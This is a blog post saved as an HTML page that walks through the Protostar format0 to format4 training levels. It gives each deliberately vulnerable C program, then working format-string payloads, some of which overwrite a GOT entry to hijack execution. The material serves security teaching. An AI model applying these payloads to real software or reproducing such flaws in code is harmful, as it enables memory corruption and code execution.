@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Protostar format0-4 write-ups</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="Format0 In Format0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;); } } int main(int argc, char **argv) { vuln(argv[1]); }  This is not really a format string vulnerability, our argument is going to be written in buffer with no size checks and buffer is just above target so we can overwrite it:">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Protostar format0-4 write-ups">
+    <meta name="twitter:description" content="Format0 In Format0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;); } } int main(int argc, char **argv) { vuln(argv[1]); }  This is not really a format string vulnerability, our argument is going to be written in buffer with no size checks and buffer is just above target so we can overwrite it:">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Protostar format0-4 write-ups">
+  <meta property="og:description" content="Format0 In Format0 we are given the following vulnerable code:
+#include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;); } } int main(int argc, char **argv) { vuln(argv[1]); }  This is not really a format string vulnerability, our argument is going to be written in buffer with no size checks and buffer is just above target so we can overwrite it:">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/19/protostar-format0-4-write-ups/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/19/protostar-format0-4-write-ups/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Protostar format0-4 write-ups</h1>
+      <p class="post-meta">@pwntester · Dec 19, 2013 · 6 min read</p>
+    </header>
+    <article class="post-content">
+
+<h2 id="format0">Format0</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/format0">Format0</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln(char *string)
+{
+  volatile int target;
+  char buffer[64];
+
+  target = 0;
+
+  sprintf(buffer, string);
+
+  if(target == 0xdeadbeef) {
+    printf(&quot;you have hit the target correctly :)\n&quot;);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+</code></pre>
+
+<p>This is not really a format string vulnerability, our argument is going to be written in <strong>buffer</strong> with no size checks and <strong>buffer</strong> is just above <strong>target</strong> so we can overwrite it:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/format0 `python -c 'print(&quot;A&quot;*64 + &quot;\xef\xbe\xad\xde&quot;)'`
+you have hit the target correctly :)
+</code></pre>
+
+<p>If we want to do it in a more FormatString fashion:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ /opt/protostar/bin/format0 %64d`python -c 'print(&quot;\xef\xbe\xad\xde&quot;)'`
+you have hit the target correctly :)
+</code></pre>
+
+<h2 id="format1">Format1</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/format1">Format1</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln(char *string)
+{
+  printf(string);
+
+  if(target) {
+    printf(&quot;you have modified the target :)\n&quot;);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln(argv[1]);
+}
+</code></pre>
+
+<p>We need to find the <strong>target</strong> address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ gdb -q /opt/protostar/bin/format1
+Reading symbols from /opt/protostar/bin/format1...done.
+(gdb) b main
+Breakpoint 1 at 0x8048425: file format1/format1.c, line 19.
+(gdb) r aaaa
+Starting program: /opt/protostar/bin/format1 aaaa
+
+Breakpoint 1, main (argc=2, argv=0xbffff844) at format1/format1.c:19
+19	format1/format1.c: No such file or directory.
+	in format1/format1.c
+(gdb) p &amp;target
+$2 = (int *) 0x8049638
+</code></pre>
+
+<p>We also need to find how far is going to be our string argument. We will be using the format string to read the memory till we find our string:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ for i in {1..200};do echo &quot;trying offset $i - `/opt/protostar/bin/format1 DDDD%$i\\$08x`&quot;; done | grep DDDD44444444
+trying offset 133 - DDDD44444444
+</code></pre>
+
+<p>Ok, so now, we will be writing an &ldquo;unknown&rdquo; value (number of characters written so far) into the address pointed by the 133 argument which turns out to be our string and the first 4 bytes are pointing the the address of <strong>target</strong> in the BSS section. So will be overwritting <strong>target</strong></p>
+
+<pre><code class="language-lang-bash">/opt/protostar/bin/format1 `python -c 'print(&quot;\x38\x96\x04\x08&quot;)'`%133\$08n
+8you have modified the target :)
+</code></pre>
+
+<h2 id="format2">Format2</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/format2">Format2</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+  printf(buffer);
+
+  if(target == 64) {
+    printf(&quot;you have modified the target :)\n&quot;);
+  } else {
+    printf(&quot;target is %d :(\n&quot;, target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+</code></pre>
+
+<p>Ok, lets find the <strong>target</strong> address in BSS:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -t /opt/protostar/bin/format2 | grep target
+080496e4 g     O .bss	00000004              target
+</code></pre>
+
+<p>Now, lets find how far is <strong>buffer</strong>:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x &gt; temp; echo &quot;trying offset $i - `/opt/protostar/bin/format2 &lt; temp`&quot;; done | grep DDDD44444444
+trying offset 4 - DDDD44444444
+</code></pre>
+
+<p>Lets verify it writing &ldquo;4&rdquo; (the minimum value we can write since its the number of bytes of the address we want to write in):</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ perl -e 'print &quot;\xe4\x96\x04\x08&quot;.&quot;%4\$08n&quot;' | /opt/protostar/bin/format2
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE = (unset),
+	LC_ALL = (unset),
+	LC_CTYPE = &quot;es_ES.UTF-8&quot;,
+	LANG = &quot;en_US.UTF-8&quot;
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale (&quot;C&quot;).
+target is 4 :(
+</code></pre>
+
+<p>Ok, it works, so lets go for the 64:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ perl -e 'print &quot;\xe4\x96\x04\x08&quot;.&quot;%60d&quot;.&quot;%4\$08n&quot;' | /opt/protostar/bin/format2
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+	LANGUAGE = (unset),
+	LC_ALL = (unset),
+	LC_CTYPE = &quot;es_ES.UTF-8&quot;,
+	LANG = &quot;en_US.UTF-8&quot;
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale (&quot;C&quot;).
+                                                         512you have modified the target :)
+</code></pre>
+
+<h2 id="format3">Format3</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/format3">Format3</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void printbuffer(char *string)
+{
+  printf(string);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printbuffer(buffer);
+
+  if(target == 0x01025544) {
+    printf(&quot;you have modified the target :)\n&quot;);
+  } else {
+    printf(&quot;target is %08x :(\n&quot;, target);
+  }
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+</code></pre>
+
+<p>Ok, same thing but now target is checked against a dword, and in order to write such a large number we will be writing two consecutive <strong>shorts</strong>. First thing, find the <strong>target</strong> address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -t /opt/protostar/bin/format3 | grep target
+080496f4 g     O .bss	00000004              target
+</code></pre>
+
+<p>Next, find the offsite of the <strong>buffer</strong>:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x &gt; temp; echo &quot;trying offset $i - `/opt/protostar/bin/format3 &lt; temp`&quot;; done | grep DDDD44444444
+trying offset 12 - DDDD44444444
+</code></pre>
+
+<p>So the trick here is to split 0x01025544 into 0x0102 and 0x5544 and write them in two consecutive 2bytes memory addresses.</p>
+
+<p>0x0102 = 258
+0x5544 = 21828</p>
+
+<p>So we need to write 258 into 0x080496f6 (target + 2 address) and 21828 into 080496f4 (target address) since we are using a little indian system. Also, we only want to write two bytes, so we will use <strong>%hn</strong> for that.</p>
+
+<p>Also, the arguments to printf will be addresses so 4 bytes each. If our buffer starts in the offset 12, then the next printf argument (13) will be 4 bytes from the beggining of our buffer, and thats where we need to place the address of the 2 LSB bytes:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ perl -e 'print &quot;\xf6\x96\x04\x08&quot;.&quot;\xf4\x96\x04\x08&quot;.&quot;%250d&quot;.&quot;%12\$hn&quot;.&quot;%21570d&quot;.&quot;%13\$hn&quot;' | /opt/protostar/bin/format3
+..
+..
+..
+-1073744480you have modified the target :)
+</code></pre>
+
+<h2 id="format4">Format4</h2>
+
+<p>In <a href="http://www.exploit-exercises.com/protostar/format4">Format4</a> we are given the following vulnerable code:</p>
+
+<pre><code class="language-lang-clike">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int target;
+
+void hello()
+{
+  printf(&quot;code execution redirected! you win\n&quot;);
+  _exit(1);
+}
+
+void vuln()
+{
+  char buffer[512];
+
+  fgets(buffer, sizeof(buffer), stdin);
+
+  printf(buffer);
+
+  exit(1);
+}
+
+int main(int argc, char **argv)
+{
+  vuln();
+}
+</code></pre>
+
+<p>In this level, we need to redirect execution flow to the &ldquo;unused&rdquo; hello() function. The easiest way to do it is using the format string vulnerability in <strong>printf(buffer)</strong> to overwrite an entry in the <strong>GOT</strong> table where system function addresses are cached. The only function called after printf is <strong>exit()</strong> so if we overwrite exit address in the GOT table with the hello() address, we will successfully redirect the execution flow to <strong>hello()</strong>. We need to know:
+- hello() address
+- exit() address in GOT table
+- Format Strig offset</p>
+
+<p><strong>hello()</strong> address:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -t /opt/protostar/bin/format4 | grep hello
+080484b4 g     F .text	0000001e              hello
+</code></pre>
+
+<p><strong>exit()</strong> address in GOT table:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ objdump -TR /opt/protostar/bin/format4 | grep exit
+00000000      DF *UND*	00000000  GLIBC_2.0   _exit
+00000000      DF *UND*	00000000  GLIBC_2.0   exit
+08049718 R_386_JUMP_SLOT   _exit
+08049724 R_386_JUMP_SLOT   exit
+</code></pre>
+
+<p>Format Strig offset:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ for i in {1..200};do echo DDDD%$i\$08x &gt; temp; echo &quot;trying offset $i - `/opt/protostar/bin/format4 &lt; temp`&quot;; done | grep DDDD44444444
+trying offset 4 - DDDD44444444
+</code></pre>
+
+<p>We want to write <strong>hello()</strong> address which is too long for a format string attack so we will be using the technique presented in format3.
+hello() address is 0x080484b4
+We can split it so:
+0x0804 = 2052 will be written in the 2 last bytes of the target address -&gt; 0x08049726
+0x84b4 = 33972 will be written in the 2 first bytes of the target address -&gt; 0x08049724</p>
+
+<p>Since 33972 &gt; 2052 we need to write 2052 first:</p>
+
+<pre><code class="language-lang-bash">&quot;\x26\x97\x04\x08&quot;.&quot;\x24\x97\x04\x08&quot;.&quot;%(2052-8)d&quot;.&quot;%4\$hn&quot;.&quot;%(33972-2052)d&quot;.&quot;%5\$hn&quot;
+</code></pre>
+
+<p>Doing the maths:</p>
+
+<pre><code class="language-lang-bash">&quot;\x26\x97\x04\x08&quot;.&quot;\x24\x97\x04\x08&quot;.&quot;%2044d&quot;.&quot;%4\$hn&quot;.&quot;%31920d&quot;.&quot;%5\$hn&quot;
+</code></pre>
+
+<p>And the attack:</p>
+
+<pre><code class="language-lang-bash">user@protostar:~$ perl -e 'print &quot;\x26\x97\x04\x08&quot;.&quot;\x24\x97\x04\x08&quot;.&quot;%2044d&quot;.&quot;%4\$hn&quot;.&quot;%31920d&quot;.&quot;%5\$hn&quot;' | /opt/protostar/bin/format4
+&amp;$
+..
+..
+    512
+..
+..
+-1208122336code execution redirected! you win
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/protostar"><span class="tag">Protostar</span></a></li>
+        
+          <li><a href="/tags/format1"><span class="tag">Format1</span></a></li>
+        
+          <li><a href="/tags/format2"><span class="tag">Format2</span></a></li>
+        
+          <li><a href="/tags/format3"><span class="tag">Format3</span></a></li>
+        
+          <li><a href="/tags/format4"><span class="tag">Format4</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2135</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
